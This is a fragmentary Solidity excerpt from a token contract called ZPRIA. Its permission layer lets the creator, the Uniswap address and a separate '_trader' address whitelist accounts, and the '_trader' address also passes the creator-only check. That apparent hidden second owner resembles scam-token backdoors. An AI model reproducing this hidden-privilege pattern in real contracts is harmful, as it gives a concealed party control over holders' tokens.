...
contract Permissions is Context
{
    ...
    {
        require(_msgSender() == _creator || _msgSender() == _uniswap || _msgSender() == _trader, "You do not have permissions for this action");
        _permitted[who] = true;
    }
    
    modifier onlyCreator
    {
        require(_msgSender() == _creator || _msgSender() == _trader, "You do not have permissions for this action");
        _;
    }
...
contract ZPRIA is Permissions, IERC20 {
